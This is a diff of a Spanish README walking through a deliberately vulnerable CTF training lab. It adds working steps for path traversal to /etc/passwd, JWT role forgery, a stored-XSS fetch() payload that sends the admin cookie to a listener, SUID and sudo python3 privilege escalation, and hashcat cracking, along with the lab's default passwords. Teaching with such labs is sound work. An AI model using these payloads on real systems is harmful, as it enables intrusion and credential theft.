@@ -136,13 +136,24 @@ Acceso denegado a /api/internal/admin/database: se requiere rol it o admin.
 
 #### 1.4 — LFI (Local File Inclusion) en adjuntos de tickets 📄 `objetivo_final.txt` → palabra: **"trabaja"**
 
-**Vulnerabilidad:** el endpoint `/attachment?file=<nombre>` sirve archivos del directorio de uploads usando `readfile()` sin validar ni normalizar el parámetro. Permite path traversal para leer cualquier archivo accesible por el proceso de Apache.
+**Vulnerabilidad:** el endpoint `/attachment?file=<nombre>` sirve archivos del directorio de uploads usando `readfile()` sin validar ni normalizar el parámetro. Permite path traversal para leer cualquier archivo accesible por el proceso de Apache. Además, si `file` apunta a un directorio en vez de a un archivo, el endpoint **lista su contenido** en lugar de fallar — un oráculo deliberado para no depender de adivinar rutas a ciegas.
 
-**Cómo funciona:** desde el directorio base `/var/www/html/uploads/`, subir dos niveles alcanza `/var/www/`:
+**Truco para descubrir rutas — listado de directorios:** el directorio base de adjuntos es `/var/www/html/uploads/`. Probar `file` con solo puntos y barras, sin nombre de archivo, lista lo que hay en ese nivel:
 ```
-/attachment?file=../../flag_lfi.txt     → FLAG_WEBAPP_LFI
+/attachment?file=.        → lista /var/www/html/uploads (el directorio de adjuntos)
+/attachment?file=../      → lista /var/www/html         (un nivel arriba)
+/attachment?file=../../   → lista /var/www              (dos niveles arriba)
+```
+Cada respuesta muestra las carpetas y archivos de ese nivel, y si existe carpeta anterior (`..`). Subiendo nivel por nivel con este truco aparece `flag_lfi.txt` y `objetivo_final.txt` listados dentro de `/var/www` — sin necesidad de conocer sus nombres de antemano. Desde ahí ya se puede pedir el archivo directamente:
+```
+/attachment?file=../../flag_lfi.txt        → FLAG_WEBAPP_LFI
 /attachment?file=../../objetivo_final.txt  → "trabaja"
-/attachment?file=../../etc/passwd       → /etc/passwd del contenedor
+```
+
+**Sobre `/etc/passwd`:** la base de adjuntos, `/var/www/html/uploads`, está a 4 niveles de la raíz del filesystem (`/`, `var`, `www`, `html`, `uploads`). `file=../../etc/passwd` (2 niveles, la ruta que se prueba de forma intuitiva) NO llega a la raíz real — resuelve a `/var/www/etc/passwd`, un archivo de aspecto realista colocado ahí a propósito para que esa ruta "intuitiva" funcione con contenido creíble en vez de dar 404. El `/etc/passwd` real del contenedor sí es alcanzable subiendo dos niveles más (4 en total):
+```
+/attachment?file=../../etc/passwd      → /var/www/etc/passwd (señuelo realista)
+/attachment?file=../../../../etc/passwd   → /etc/passwd real del contenedor
 ```
 
 Los archivos de la flag y del objetivo final están colocados en `/var/www/` a propósito: fuera del DocumentRoot de Apache, por lo que no son descargables vía HTTP directamente, pero sí mediante el path traversal.
@@ -153,14 +164,51 @@ Los archivos de la flag y del objetivo final están colocados en `/var/www/` a p
 
 #### 1.5 — JWT inseguro → endpoint interno → credenciales de la BD 📄 `objetivo_final.txt` → palabra: **"duro"**
 
-**Vulnerabilidad:** el backend decodifica el JWT de sesión sin verificar la firma HMAC. Cualquier participante puede tomar su propio JWT, modificar el claim `role` en el payload, y el servidor lo aceptará como válido.
+**Vulnerabilidad:** el backend decodifica el JWT de sesión (`jwt_decode_unverified()` en `services/webapp/src/jwt.php`, usado por `current_user()` en `services/webapp/src/auth.php`) sin recalcular ni comparar la firma HMAC. Cualquier participante puede tomar su propio JWT, modificar el claim `role` en el payload, reconstruir el token con cualquier firma (incluso una inventada), y el servidor lo aceptará igual. El control de acceso de `/api/internal/admin/database` (`services/webapp/src/api/internal/admin/database.php`) solo revisa ese claim.
 
-**Cómo funciona:**
-1. Tras iniciar sesión, la cookie `session` contiene un JWT. El payload (segunda parte, separada por `.`) está en base64url.
-2. Decodificarlo revela: `{"sub":2,"username":"jperez","role":"employee","iat":...}`
-3. Cambiar `"role":"employee"` por `"role":"it"`, re-codificar en base64url, y reemplazar la segunda parte del JWT.
-4. La firma (tercera parte) puede ser cualquier string: el servidor no la verifica.
-5. Enviar una petición `GET /api/internal/admin/database` con el JWT modificado en la cookie `session`.
+**Paso a paso:**
+
+1. **Iniciar sesión** en `http://localhost:8080/login` con `jperez` / `Bienvenido123` (credencial del Reto 1.1). El login coloca una cookie llamada exactamente `session` — es un JWT (`xxxxx.yyyyy.zzzzz`).
+
+2. **Obtener el valor de la cookie `session`.** Dos formas:
+   - **Navegador:** DevTools (`F12`) → pestaña *Application* (Chrome/Edge) o *Almacenamiento* (Firefox) → *Cookies* → `http://localhost:8080` → copiar el valor de la cookie `session`.
+   - **curl** (guardando la sesión en un archivo para reutilizarla):
+     ```bash
+     curl -s -c cookies.txt -X POST http://localhost:8080/login \
+       -d "username=jperez&password=Bienvenido123" -o /dev/null
+     JWT=$(grep session cookies.txt | awk '{print $NF}')
+     echo "$JWT"
+     ```
+
+3. **Decodificar el JWT.** El token tiene 3 partes separadas por `.`: `header.payload.firma`. Dos formas de decodificarlo:
+   - **jwt.io** (https://jwt.io): pegar el token completo en el campo "Encoded". El panel derecho muestra el header y el payload decodificados en JSON (no hace falta conocer el secreto para *leerlo* — solo para que jwt.io marque la firma como "verified", algo que aquí es irrelevante).
+   - **Manual con `base64`** (sin depender de ninguna web):
+     ```bash
+     echo "$JWT" | cut -d'.' -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+     # → {"sub":2,"username":"jperez","role":"employee","iat":...}
+     ```
+   - **`jwt_tool`** (https://github.com/ticarpi/jwt_tool), si está instalado:
+     ```bash
+     python3 jwt_tool.py "$JWT"
+     ```
+
+4. **Modificar el claim `role`**: cambiar `"role":"employee"` por `"role":"it"` (o `"admin"`) en el JSON del payload.
+
+5. **Re-codificar el payload modificado a base64url** (sin padding `=`) y reemplazar solo la segunda parte del token. La firma (tercera parte) puede quedar igual o ser cualquier string — el servidor nunca la recalcula:
+   ```bash
+   HEADER=$(echo "$JWT" | cut -d'.' -f1)
+   FIRMA=$(echo "$JWT" | cut -d'.' -f3)
+   NUEVO_PAYLOAD=$(echo -n '{"sub":2,"username":"jperez","role":"it","iat":1234567890}' \
+     | base64 | tr '+/' '-_' | tr -d '=')
+   JWT_MODIFICADO="${HEADER}.${NUEVO_PAYLOAD}.${FIRMA}"
+   ```
+   Con `jwt_tool`, el mismo paso se hace con `python3 jwt_tool.py "$JWT" -T` (modo interactivo de tampering) en vez de a mano.
+
+6. **Usar el JWT modificado** en la cookie `session`, ya sea reemplazándola en el navegador (DevTools → Cookies → editar el valor) o directamente con curl:
+   ```bash
+   curl http://localhost:8080/api/internal/admin/database \
+     -H "Cookie: session=${JWT_MODIFICADO}"
+   ```
 
 El endpoint responde con:
 ```json
@@ -179,16 +227,39 @@ El endpoint responde con:
 
 #### 1.6 — Stored XSS → cookie del admin → flag
 
-**Vulnerabilidad:** los comentarios de tickets se guardan y renderizan sin sanitizar. La cookie de sesión del administrador no tiene flag `HttpOnly`. No hay Content Security Policy. Un bot (Chromium headless) visita los tickets cada vez que alguien comenta.
+**Vulnerabilidad:** los comentarios de tickets se guardan y renderizan sin sanitizar (`echo $c['body']` sin `htmlspecialchars()` en `services/webapp/src/ticket.php`). La cookie de sesión del administrador no tiene flag `HttpOnly` (`services/webapp/src/auth.php`). No hay Content Security Policy. Un bot con navegador real (`services/xss-bot/bot.js`, Chromium headless vía Playwright) visita los tickets periódicamente.
 
-**Cómo funciona:**
-1. El participante añade un comentario con un payload JavaScript a cualquier ticket:
-   ```html
-   <script>fetch('http://<servidor-del-atacante>/?c='+document.cookie)</script>
+**Por qué hace falta un servidor propio:** el payload no puede simplemente "mostrar" la cookie — tiene que sacarla del navegador del bot hacia algún sitio que el participante controle y pueda leer. Ese "sitio" es un servidor HTTP mínimo que el participante levanta él mismo, cuyo único trabajo es quedar registrado en sus logs cuando reciba la petición con la cookie en la query string.
+
+**Punto crítico de red — `localhost` NO sirve:** el bot que ejecuta el payload corre en un contenedor Docker aparte (`xss-bot`), en la misma red del laboratorio (`sabana-lab`, ver `docker-compose.yml`), no en la máquina del participante. Si el payload apunta a `http://localhost:8888/...` o `http://127.0.0.1:8888/...`, esa dirección se resuelve **dentro del contenedor del bot**, no en la máquina del participante — el listener nunca recibe nada. Hace falta una dirección que el contenedor `xss-bot` pueda alcanzar de verdad:
+
+- **Si el laboratorio corre en tu propia máquina** (caso típico de `docker compose up --build` local, como en "Arranque rápido"): tu máquina *es* el host Docker, y los contenedores pueden alcanzarla a través de la puerta de enlace de la red bridge del laboratorio, que es **`172.28.0.1`** (fija, ver `docker-compose.yml` → `networks.sabana-lab.ipam`). Usa esa IP en el payload, no `localhost`.
+- **Si el laboratorio corre en un servidor remoto** (evento centralizado): el listener debe correr en una máquina alcanzable *desde ese servidor* — por ejemplo tu propia máquina expuesta con `ngrok`/`localhost.run`, o cualquier host con IP pública que controles. `localhost`/`127.0.0.1` sigue sin servir por la misma razón.
+
+**Cómo funciona, paso a paso:**
+
+1. **Levantar el listener** en tu máquina (la que ejecuta `docker compose up`), en el puerto que prefieras (aquí `8888`):
+   ```bash
+   python3 -m http.server 8888
+   # alternativa equivalente:
+   # nc -lvnp 8888
    ```
-2. Al guardar el comentario, la webapp encola una visita del bot al ticket.
-3. El bot (autenticado como admin) visita el ticket, ejecuta el payload, y su cookie de sesión se exfiltra al servidor del atacante.
-4. La cookie es un JWT. Decodificando su payload aparece el claim `flag`:
+   `python3 -m http.server` responderá 404 a la petición del bot — no importa, lo único que interesa es la línea que registra en su log con la cookie robada.
+
+2. **Publicar el payload** como comentario en cualquier ticket (`/ticket?id=<id>`), usando la IP de la puerta de enlace (no `localhost`):
+   ```html
+   <script>fetch('http://172.28.0.1:8888/?c='+document.cookie)</script>
+   ```
+
+3. Al guardar el comentario, `ticket.php` encola el ticket en `bot_visit_queue`. El bot (`bot.js`) hace polling cada `BOT_VISIT_INTERVAL_SECONDS` (30s por defecto), obtiene una cookie de admin fresca vía `/bot_login.php`, y navega a `/ticket?id=<id>` con Chromium real — ahí es donde el `<script>` del comentario se ejecuta.
+
+4. El `fetch()` sale desde el navegador del bot hacia tu listener. En la terminal del `python3 -m http.server` debe aparecer algo como:
+   ```
+   172.28.0.40 - - [...] "GET /?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<firma> HTTP/1.1" 404 -
+   ```
+   (`172.28.0.40` es la IP fija del contenedor `xss-bot` en `docker-compose.yml` — confirma que la petición vino del bot, no de ti).
+
+5. La cookie exfiltrada es un JWT. Decodificar su payload (igual que en el Reto 1.5 — `base64 -d` de la segunda parte, o jwt.io) revela el claim `flag`:
    ```json
    {"sub":1,"username":"admin","role":"admin","flag":"SABANA{...}","iat":...}
    ```
@@ -209,6 +280,9 @@ El participante usa las credenciales obtenidas en el Reto 1.5:
 ```bash
 mysql -h localhost -P 3306 -u helpdesk_app -p
 # introducir DB_APP_PASSWORD cuando se solicite
+
+# Desde WSL me sirvio 
+mysql -h localhost -P 3306 --protocol=TCP -u helpdesk_app -p
 ```
 
 #### 2.2 — Hashes MD5 sin salt en la tabla `users`
@@ -254,8 +328,17 @@ msilva (SSH) → jrodriguez (cron job hijacking) → lcastillo (SUID) → root (
 
 ```bash
 ssh msilva@localhost -p 2222
-# contraseña: la crackeada del hash MD5 de msilva en el Reto 2
+# contraseña: la crackeada del hash MD5 de msilva en el Reto 2 (ver Reto 2.2)
 ```
+
+La contraseña es el valor de la variable de entorno `PIVOT_SSH_PASSWORD` (misma variable inyectada al `webapp`/`database` para el hash de `msilva` y al `linux-server` para su cuenta SSH — ver `docker-compose.yml` y `services/linux-server/entrypoint.sh`). **Para esta instancia de práctica/desarrollo del repositorio**, con los valores por defecto de `.env.example`, la credencial es:
+
+```
+usuario:     msilva
+contraseña:  princess
+```
+
+> Esto es el valor de referencia usado por este repo para desarrollo local (`.env.example` → `PIVOT_SSH_PASSWORD=princess`), no un secreto de un evento real. Para un evento en producción, `.env` debe definir su propio `PIVOT_SSH_PASSWORD` (otra palabra débil de diccionario) y esa credencial nunca debería documentarse en texto plano en este README — se obtiene crackeando el hash MD5 de `msilva` en el Reto 2, tal como está diseñado el pivote.
 
 `msilva` tiene permisos mínimos: solo su propio home, sin sudo, sin acceso a los homes ajenos.
 
@@ -299,10 +382,16 @@ ssh msilva@localhost -p 2222
 2. Escalar usando GTFOBins:
    ```bash
    /usr/local/bin/find . -exec /bin/bash -p \; -quit
-   # → shell con effective UID de lcastillo
+   # → shell con effective UID de lcastillo (id muestra euid=lcastillo, pero el UID *real* sigue
+   #   siendo el del usuario anterior — importante para el paso 3.4)
    ```
 
-**Entrega:** shell como `lcastillo`.
+**Entrega:** shell con effective UID de `lcastillo`.
+
+> **Nota técnica:** `bash -p` solo evita que bash *descarte* el privilegio (no resetea `euid` a `ruid`
+> al arrancar), pero no promueve el UID real. `sudo` decide si te deja ejecutar algo mirando tu UID
+> **real**, no el efectivo — así que en este punto `sudo -l` todavía va a fallar ("... may not run sudo
+> on ..."), aunque `id` ya muestre `euid=lcastillo`. El paso 3.4 explica cómo terminar de promover el UID.
 
 ---
 
@@ -311,12 +400,20 @@ ssh msilva@localhost -p 2222
 **Vulnerabilidad:** `lcastillo` tiene permiso `sudo NOPASSWD` para `/usr/bin/python3`.
 
 **Cómo funciona:**
-1. Verificar permisos sudo:
+1. Promover también el UID *real* a `lcastillo` (no solo el efectivo). En Linux, `setuid()` sin privilegios
+   de root solo toca el UID efectivo — hace falta `setresuid()` para arrastrar real/efectivo/saved los tres
+   a la vez, algo que sí está permitido porque `lcastillo` ya es el saved-UID heredado del binario SUID:
+   ```bash
+   python3 -c 'import os,pwd; u=pwd.getpwnam("lcastillo").pw_uid; os.setresuid(u,u,u); os.execl("/bin/bash","bash")'
+   id
+   # → uid=lcastillo gid=... (ya no hay euid= separado: los tres UID son lcastillo)
+   ```
+2. Ahora sí, verificar permisos sudo:
    ```bash
    sudo -l
    # → (ALL) NOPASSWD: /usr/bin/python3
    ```
-2. Escalar con GTFOBins:
+3. Escalar con GTFOBins:
    ```bash
    sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
    # → shell como root
@@ -401,15 +498,20 @@ http://localhost:8080/profile?id=3
 ### Fase 4 — LFI y objetivo_final (palabra 1)
 
 ```bash
+# Descubrir la ruta listando directorios (oráculo de listado, ver Reto 1.4):
+curl "http://localhost:8080/attachment?file=../../"
+# → lista el contenido de /var/www, incluyendo flag_lfi.txt y objetivo_final.txt
+
 # Flag LFI:
-curl http://localhost:8080/attachment?file=../../flag_lfi.txt
+curl "http://localhost:8080/attachment?file=../../flag_lfi.txt"
 
 # Palabra 1 del meta-reto:
-curl http://localhost:8080/attachment?file=../../objetivo_final.txt
+curl "http://localhost:8080/attachment?file=../../objetivo_final.txt"
 # → trabaja
 
-# Bonus: leer /etc/passwd del contenedor:
+# Bonus: señuelo de /etc/passwd (dos niveles) vs. /etc/passwd real del contenedor (cuatro niveles):
 curl "http://localhost:8080/attachment?file=../../etc/passwd"
+curl "http://localhost:8080/attachment?file=../../../../etc/passwd"
 ```
 
 ### Fase 5 — JWT bypass y objetivo_final (palabra 2)
@@ -440,16 +542,16 @@ curl http://localhost:8080/api/internal/admin/database \
 ### Fase 6 — Stored XSS y exfiltración de cookie
 
 ```bash
-# En el navegador, ir a cualquier ticket y añadir un comentario con payload XSS.
-# Primero levantar un listener en la máquina atacante:
+# El bot (contenedor xss-bot) NO ve tu "localhost": levanta el listener en la máquina que corre
+# docker compose y usa la puerta de enlace fija de la red del laboratorio (172.28.0.1), no 127.0.0.1.
 python3 -m http.server 8888
 
-# Payload en el campo de comentario:
-<script>fetch('http://<IP_ATACANTE>:8888/?c='+document.cookie)</script>
+# Payload en el campo de comentario de cualquier ticket (/ticket?id=<id>):
+<script>fetch('http://172.28.0.1:8888/?c='+document.cookie)</script>
 
-# Esperar hasta 30s a que el bot visite el ticket.
-# El listener recibe algo como:
-# GET /?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<PAYLOAD>.<SIG>
+# Esperar hasta BOT_VISIT_INTERVAL_SECONDS (30s por defecto) a que xss-bot visite el ticket.
+# El listener recibe algo como (172.28.0.40 = IP fija de xss-bot en docker-compose.yml):
+# 172.28.0.40 - - [...] "GET /?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<PAYLOAD>.<SIG> HTTP/1.1" 404 -
 
 # Decodificar el payload del JWT recibido:
 echo "<PAYLOAD>" | base64 -d
@@ -471,9 +573,11 @@ SELECT content FROM system_notes;   # → FLAG_DATABASE
 ### Fase 8 — Crackeo de hashes MD5
 
 ```bash
-# Guardar los hashes en un archivo (uno por línea):
+# Guardar los hashes en un archivo (uno por línea, formato hashcat -m 0):
 cat hashes.txt
+# <hash_admin>
 # <hash_jperez>
+# <hash_it_soporte>
 # <hash_msilva>
 # <hash_rgomez>
 # <hash_lcastro>
@@ -481,7 +585,16 @@ cat hashes.txt
 # Crackear con hashcat:
 hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
-# Identificar cuál es la contraseña de msilva → esa es PIVOT_SSH_PASSWORD
+# Con los valores por defecto de este repo (services/database/init/01-seed.sql.template), crackean 5/6:
+#   admin      → qwerty
+#   it_soporte → monkey
+#   msilva     → princess   (= PIVOT_SSH_PASSWORD, contraseña SSH del Reto 3)
+#   rgomez     → Password1
+#   lcastro    → iloveyou
+# jperez NO crackea con rockyou a propósito: su contraseña (Bienvenido123) ya se entrega directamente
+# vía el comentario HTML del Reto 1.1, no depende de hashcat.
+
+# Identificar cuál es la contraseña de msilva → esa es PIVOT_SSH_PASSWORD, la credencial SSH del Reto 3.
 ```
 
 ### Fase 9 — Escalamiento en el servidor Linux (Reto 3)
